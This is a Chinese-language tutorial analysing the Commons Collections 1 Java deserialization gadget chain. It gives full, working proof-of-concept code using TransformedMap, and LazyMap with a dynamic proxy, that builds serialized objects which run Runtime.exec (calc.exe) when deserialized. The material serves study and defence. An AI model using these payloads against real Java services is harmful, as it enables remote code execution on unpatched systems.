## 概述

Commons Collections的利用链也被称为CC链，在学习反序列化漏洞必不可少的一个部分。Apache Commons
Collections是Java中应用广泛的一个库，包括Weblogic、JBoss、WebSphere、Jenkins等知名大型Java应用都使用了这个库。

## 环境

  * Commons Collections 3.1

  * JDK7u_21

注：只能在JDK7复现成功，因为JDK8u71后跟新了`AnnotationInvocationHandler`的`readObject`方法

## 简化版POC代码

因为真正的POC比较复杂，一下子看过去可能接受不了。所以先分析分析P牛自己造的简化版代码来消化消化知识。

    
    
    package org.vulhub.Ser;
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.util.HashMap;
    import java.util.Map;
    
    public class CommonCollections1 {
        public static void main(String[] args) throws Exception {
            Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.getRuntime()),
                new InvokerTransformer("exec", new Class[]{String.class},
                new Object[]{"/System/Applications/Calculator.app/Contents/MacOS/Calculator"}),
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
            outerMap.put("test", "xxxx");
        }
    }
    

介绍下涉及到几个类和接口

 **Transformer接口**

该接口只有一个待实现的方法`transfor`，`ConstantTransformer`、`InvokerTransformer`、`ChainedTransformer`这三个类都实现了该接口。

![image](https://image.3001.net/images/20220322/1647952674_6239c32255b83387e8bfe.png!small)

 **ConstantTransformer类**

实现了Transformer接口的⼀个类，在构造函数的时候传⼊⼀个对象，通过transform⽅法将这个对象返回。

![image](https://image.3001.net/images/20220322/1647952665_6239c31935504ccfa3c99.png!small)

 **InvokerTranformer类**

实现了Transformer接口的⼀个类，这个类也是该链条最后能成功执行任意代码的关键

在构造函数的时候传入要执行的方法，方法对应的参数类型，和参数值。再通过transform方法时候传入`Runtime.getRuntime()`对象,就会造成任意代码执行，即执行了input对象的iMethodName方法。

![image](https://image.3001.net/images/20220322/1647952654_6239c30e085e0ded4134b.png!small)

 **ChainedTransformer类**

实现了Transformer接口的⼀个类，它的`transform`方法作用是对传进来的Transformer数组进行遍历，并把前一个回调返回的结果，作为后一个回调的参数进行传入。

这样就可以把`ConstantTransformer`、`InvokerTransformer`类串在了一起，先通过`ConstantTransformer`的`transform`方法，返回一个`Runtime.getRuntime()`对象，然后作为`InvokerTransformer`类`transform`的方法的`input`参数传入，最后执行任意代码。

![image](https://image.3001.net/images/20220322/1647952644_6239c30412ecb4e431a2d.png!small)

 **TransformedMap类**

Transform来执行命令需要绑定到Map上，抽象类AbstractMapDecorator是Apache Commons
Collections提供的一个类，实现类有很多。
比如LazyMap、TransformedMap等，这些类都有一个decorate()方法，用于将上述的Transformer实现类绑定到Map上。把Transformer实现类分别绑定到map的key和value上，当map的key或value被修改时，会调用对应Transformer实现类的transform()方法。把chainedtransformer绑定到一个TransformedMap上，当此map的key或value发生改变时，就会自动触发chainedtransformer。不同的Map类型有不同的触发规则。

![image](https://image.3001.net/images/20220322/1647952630_6239c2f69fad3230679dd.png!small)

最后我们通过decorate方法把transformerChain绑定到Map的value上，当value发生变化时，就会触发transformerChain的transfor方法。

 **链条**

![image](https://image.3001.net/images/20220322/1647952620_6239c2ec482e1b84113a5.png!small)

    
    
    TransformedMap.put
    ->TransformedMap.transformValue
    ->ChainedTransformer.transform (循环回调)
    ->InvokerTransformer.transform
    

## 进阶版POC代码

上面的代码执只是⼀个用来在本地测试的类。在实际反序列化漏洞中，我们需要将上面最终生成的outerMap对象变成⼀个序列化流。

我们如何⽣成⼀个可以利用的反序列化POC呢？中间又会遇到哪些问题呢？

 **问题一**

有Java基础的就会知道Java中不是所有对象都支持序列化，待序列化的对象和所有它使用的内部属性对象，必须都实 现了
`java.io.Serializable`接口。而我们最早传给`ConstantTransformer`的是`Runtime.getRuntime()
`，`Runtime`类是没有实现 `java.io.Serializable`接口的，所以不允许被序列化。

那怎么解决呢？这里就需要利用反射来获取到当前上下文中的Runtime对象，而不需要直接使用这个类。

    
    
    Runtime rt = (Runtime) Runtime.class.getMethod("getRuntime").invoke(null);
    rt.exec("calc.exe");
    

**转成transform写法如下：**

    
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    import org.apache.commons.collections.map.TransformedMap;
    import java.io.FileInputStream;
    import java.io.ObjectInputStream;
    import java.lang.reflect.Method;
    import java.util.HashMap;
    import java.util.Map;
    import java.util.StringTokenizer;
    
    public class CommonCollections1 {
        public static void main(String[] args) throws Exception {
            Transformer[] transformers = new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Object[0]}),
                    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
    
            };
            Transformer transformerChain = new ChainedTransformer(transformers);
            Map innerMap = new HashMap();
            Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
            outerMap.put("test", "xxxx");
        }
    }
    

分析下几个循环

 **第一个循环**

    
    
    new ConstantTransformer(Runtime.class)
    

![image](https://image.3001.net/images/20220322/1647952604_6239c2dcb7ca8d1c4fc03.png!small)

直接返回传入的Runtime.class对象

 **第二个循环**

    
    
    new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Object[0]})
    

![image](https://image.3001.net/images/20220322/1647952595_6239c2d36fa9e58d762e2.png!small)

![image](https://image.3001.net/images/20220322/1647952586_6239c2ca071471a885bc7.png!small)

传入的`input`为一个循环返回的`Runtime.class`对象，`getClass`方法返回一个Class对象，之后用`getMethod`方法调用`Class对象的getMethod方法`，可以看成是反射调用反射。返回`java.lang.Runtime.getRuntime()`，接下来是调用这个方法对象。

 **第三个循环**

    
    
    new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]})
    

![image](https://image.3001.net/images/20220322/1647952574_6239c2bede4bab8301fdb.png!small)

![image](https://image.3001.net/images/20220322/1647952565_6239c2b5d6623ef1b2195.png!small)

因为input是一个方法`java.lang.Runtime.getRuntime()`，所以`getClass`方法返回的是一个`Method对象`，之后获取Method对象的`invoke`方法，最后相当于是`invoke.invoke(java.lang.Runtime.getRuntime,null)`，返回了一个Runtime实例化对象。

 **第四个循环**

    
    
    new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"})
    

![image](https://image.3001.net/images/20220322/1647952554_6239c2aaab62e20cfa0cf.png!small)

![image](https://image.3001.net/images/20220322/1647952543_6239c29f099622f7b10da.png!small)

input的是`Runtime的对象`,所以`getClass`方法返回就是`Runtime.class`的对象，回到最初的反射调用，命令执行成功。

## 最终版POC代码

 **问题二**

触发这个漏洞的核心，在于当对Map进行一些操作时，会自动触发Transformer实现类的tranform()方法。在上面的代码中，我们是人为执行`outerMap.get("test",
"xxxx")`来触发漏洞，但在实际反序列化时，我们需要找到一个 类，它在反序列化的`readObject`逻辑里有类似的写入、修改等操作来触发链条。

 **AnnotationInvocationHandler类**

这个类就是`sun.reflect.annotation.AnnotationInvocationHandler`

 **构造方法**

![image](https://image.3001.net/images/20220322/1647952531_6239c29311d4b0961f36f.png!small)

 **看下readObject方法**

![image](https://image.3001.net/images/20220322/1647952521_6239c2894899d73b082b0.png!small)

memberValues就是反序列化后得到的Map，也是经过了TransformedMap修饰的对象，这里遍历了它
的所有元素，并依次设置值。在调用setValue设置值的时候就会触发TransformedMap里注册的
Transform，进而执行我们为其精心设计的任意代码。

创建个`sun.reflect.annotation.AnnotationInvocationHandler`实例化对象并将前面构造的
HashMap设置进来。

因为`sun.reflect.annotation.AnnotationInvocationHandler`是JDK内部的类。不能直接使
用new来实例化。我使用反射获取到了它的构造方法，并将其设置成外部可见的，再调用就可以实例化。

    
    
    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
    construct.setAccessible(true);
    InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
    

然后把组合好的POC,运行看看能不能反序列成功

    
    
    FileOutputStream fileOutputStream = new FileOutputStream("./cc1.ser");
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
    objectOutputStream.writeObject(handler);
    objectOutputStream.close();
    fileOutputStream.close();
    
    FileInputStream fileInputStream = new FileInputStream("./cc1.ser");
    ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
    objectInputStream.readObject();
    objectInputStream.close();
    fileInputStream.close();
    

发现没报错也没弹出计算器，调试发现在`AnnotationInvocationHandler:readObject`的逻辑中，有一个if语句对var7进行判断，只有在其不
是null的时候才会进入里面执行`setValue`，否则不会进入也就不会触发漏洞

![image](https://image.3001.net/images/20220322/1647952507_6239c27bdb926bfa095af.png!small)

那么如何让这个var7不为null呢？涉及到Java注释相关的技术,后面再分析。

 **先给出两个条件：**

  1. sun.reflect.annotation.AnnotationInvocationHandler 构造函数的第一个参数必须是 Annotation的子类，且其中必须含有至少一个方法，假设方法名是X

  2. 被 TransformedMap.decorate 修饰的Map中必须有一个键名为X的元素

![image](https://image.3001.net/images/20220322/1647952495_6239c26f904cd212c9a50.png!small)

    
    
    [java.lang.annotation.Annotation]接口中有这么一句话，用来描述『注解』
    The common interface extended by all annotation types
    所有的注解类型都继承自这个普通的接口（Annotation）
    
    
    
    注解@Retention的定义，其实它本质上就是：
    public interface Retention extends Annotation{
    
    }
    

![image](https://image.3001.net/images/20220322/1647952483_6239c263e2fa15a314ee5.png!small)

**完整POC代码**

    
    
    Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
    
    };
    
    Transformer transformerChain = new ChainedTransformer(transformers);
    Map innerMap = new HashMap();
    innerMap.put("value", "xxxx");
    Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain);
    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
    construct.setAccessible(true);
    InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
    
    FileOutputStream fileOutputStream = new FileOutputStream("./cc1.ser");
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
    objectOutputStream.writeObject(handler);
    objectOutputStream.close();
    fileOutputStream.close();
    
    FileInputStream fileInputStream = new FileInputStream("./cc1.ser");
    ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
    objectInputStream.readObject();
    objectInputStream.close();
    fileInputStream.close();
    

**链条**

![image](https://image.3001.net/images/20220322/1647952471_6239c2573dd4344b5a035.png!small)

    
    
    AnnotationInvocationHandler.readObject()
    ->AbstractInputCheckedMapDecorator.setValue()
    ->TransformedMap.checkSetValue()
    ->ChainedTransformer.transform() (循环回调)
    ->InvokerTransformer.transform()
    

## ysoserial版POC代码

 **先贴一个完整Gadget链条**

    
    
    Gadget chain:
    		ObjectInputStream.readObject()
    			AnnotationInvocationHandler.readObject()
    				Map(Proxy).entrySet()
    					AnnotationInvocationHandler.invoke()
    						LazyMap.get()
    							ChainedTransformer.transform()
    								ConstantTransformer.transform()
    								InvokerTransformer.transform()
    									Method.invoke()
    										Class.getMethod()
    								InvokerTransformer.transform()
    									Method.invoke()
    										Runtime.getRuntime()
    								InvokerTransformer.transform()
    									Method.invoke()
    										Runtime.exec()
    

**区别**

 **①LazyMap类**

链条里使用的类是`LazyMap`这个类，这个类和`TransformedMap`类似。都是`AbstractMapDecorator`继承抽象类是`Apache
Commons
Collections`提供的一个类。在两个类不同点在于`TransformedMap`是在`put`方法去触发`transform`方法，而`LazyMap`是在`get`方法去调用方法。

![image](https://image.3001.net/images/20220322/1647952458_6239c24a66bd3827d2647.png!small)

当调用get(key)的key不存在时，会调用transformerChain的transform()方法。

 **修改下原来的代码**

    
    
    Transformer[] transformers = new Transformer[] {
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
    
    };
    Transformer transformerChain = new ChainedTransformer(transformers);
    Map innerMap = new HashMap();
    innerMap.put("test", "xxxx");
    Map outerMap = LazyMap.decorate(innerMap, transformerChain);
    outerMap.get("1");
    

同样可以执行命令

![image](https://image.3001.net/images/20220322/1647952442_6239c23a1558adbf6c579.png!small)

    
    
    LazyMap.get()
    ->ChainedTransformer.transform() (循环回调)
    ->InvokerTranformer.transform()
    

**②AnnotationInvocationHandler.invoke方法**

 **动态代理概念**

参考文章
[Java动态代理InvocationHandler和Proxy学习笔记](https://blog.csdn.net/yaomingyang/article/details/80981004)

`InvocationHandler`接口是`proxy`代理实例的调用处理程序实现的一个接口，每一个proxy代理实例都有一个关联的调用处理程序；在代理实例调用方法时，方法调用被编码分派到调用处理程序的`invoke`方法。

每一个 **动态代理类** 的调用处理程序都
**必须实现`InvocationHandler`接口**，并且每个代理类的实例都关联到了实现该接口的动态代理类调用处理程序中，当我们通过
**动态代理对象调用一个方法** 时候，这个方法的调用就会被 **转发** 到
**实现`InvocationHandler`接口类的`invoke`方法**来调用。

`LazyMap.get`可以在`AnnotationInvocationHandler.invoke`中被调用，只要给`LazyMap`设置`动态代理`，`LazyMap调用方法`的时候就能调用`invoke`，而`AnnotationInvocationHandler`的`readObject`中又调用了`LazyMap.entrySet`方法，最后需要将绑定了`chainedtransformer`的`Map`传入`AnnotationInvocationHandler`的构造方法中，反序列化`AnnotationInvocationHandler`，整条利用链就又巧妙的连起来了。

 **Proxy类**

Proxy类就是用来创建一个代理对象的类，它提供了很多方法，但是我们最常用的是`newProxyInstance`方法。

这个方法的作用就是创建一个代理类对象，它接收三个参数

  * loader：用哪个类加载器去加载代理对象

  * interfaces：动态代理类需要实现的接口

  * h：动态代理方法在执行时，会调用h里面的invoke方法去执行

![image](https://image.3001.net/images/20220322/1647952421_6239c22568a43a9844924.png!small)

 **使用`LazyMap`+动态代理构造利用链**

我们需要对实现了`Map`接口的类进行`Proxy`，`LazyMap`实现了`Map`接口，所以只要调用了`LazyMap`的任意方法，都会直接去调用`AnnotationInvocationHandler`类的invoke()方法。

    
    
    Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
    

但我们不能直接对其进行序列化，因为我们入口点是`sun.reflect.annotation.AnnotationInvocationHandler.readObject`，所以我们还需要再用
`AnnotationInvocationHandler`对这个`proxyMap`进行包裹。

    
    
    handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);
    

**最终POC**

    
    
    Transformer[] transformers = new Transformer[] {
    
        new ConstantTransformer(Runtime.class),
    
        new InvokerTransformer("getMethod",new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
    
        new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
    
        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc.exe"}),
    
    };
    
    Transformer transformerChain = new ChainedTransformer(transformers);
    Map innerMap = new HashMap();
    Map outerMap = LazyMap.decorate(innerMap, transformerChain);
    Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
    Constructor construct = clazz.getDeclaredConstructor(Class.class, Map.class);
    construct.setAccessible(true);
    InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention.class, outerMap);
    Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] {Map.class}, handler);
    handler = (InvocationHandler) construct.newInstance(Retention.class, proxyMap);
    
    FileOutputStream fileOutputStream = new FileOutputStream("./cc1.ser");
    ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
    objectOutputStream.writeObject(handler);
    objectOutputStream.close();
    fileOutputStream.close();
    
    FileInputStream fileInputStream = new FileInputStream("./cc1.ser");
    ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
    objectInputStream.readObject();
    objectInputStream.close();
    fileInputStream.close();
    

**链条**

![image](https://image.3001.net/images/20220322/1647952389_6239c205779a6e4c053ab.png!small)

    
    
    AnnotationInvocationHandler.readObject()
    ->$Proxy.entrySet()动态代理执行AnnotationInvocationHandler.invoke()
    ->LazyMap.get()
    ->ChainedTransformer.transform() (循环回调)
    ->InvokerTransformer.transform()
    

## 总结

①该链条通用性不强，在`jdk8u_71`后修改了`AnnotationInvocationHandler.readObject()`方法，就不能利用上面的链条触发漏洞。

②对于像我这种初学者来说，学一条很长的链条可以把一条链条切成几部分一步步吸收比较好点。

③遇到了高版本有没有其他方法绕过呢？等本菜鸟学完再来分享***。

## 参考文章

P牛的JAVA安全漫谈系列  
[Java安全之Commons
Collections1分析前置知识](https://www.cnblogs.com/nice0e3/p/13758664.html#map)  
[ysoserial分析【一】Apache Commons
Collections](https://www.cnblogs.com/litlife/p/12571787.html#transformer)  
[Java动态代理InvocationHandler和Proxy学习笔记](https://blog.csdn.net/yaomingyang/article/details/80981004)

